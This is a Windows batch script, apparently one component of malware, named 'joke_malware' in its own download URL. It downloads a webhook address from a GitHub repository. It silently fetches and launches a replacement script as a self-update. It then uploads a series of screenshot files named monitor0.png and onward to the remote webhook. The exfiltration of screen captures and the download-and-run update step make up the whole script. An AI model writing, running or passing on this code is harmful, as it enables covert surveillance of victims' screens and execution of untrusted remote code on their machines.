@echo off
if not exist "%~dp0url.txt" (
    curl -s -L "https://raw.githubusercontent.com/BOBZERO-afk/joke_malware/refs/heads/main/url.txt" -o "url.txt"
)
for /f "tokens=1 delims=" %%a in (url.txt) do set WEBHOOK_URL=%%a

set i=0
set "Version=1_0"

if exist "version.txt" del "version.txt"
curl -s -L "https://raw.githubusercontent.com/thompog/d/refs/heads/main/version.txt" -o "version.txt"
for /f "tokens=1 delims=" %%a in (version.txt) do set Nversion=%%a
if "%Version%"=="%Nversion%" (
    del version.txt 
) else (
    Ren "%~f0" "%~dp0OLD.bat"
    curl -s -L "https://raw.githubusercontent.com/thompog/bob/refs/heads/main/send.bat" -o "send.bat"
    start "" cmd /c "timeout /t 2 && start send.bat"
    exit /b 0
)

:loop
if not exist "monitor%i%.png" goto done

curl -s -X POST -F "file=@monitor%i%.png" %WEBHOOK_URL%

set /a i+=1
goto loop

:done
exit /b 0
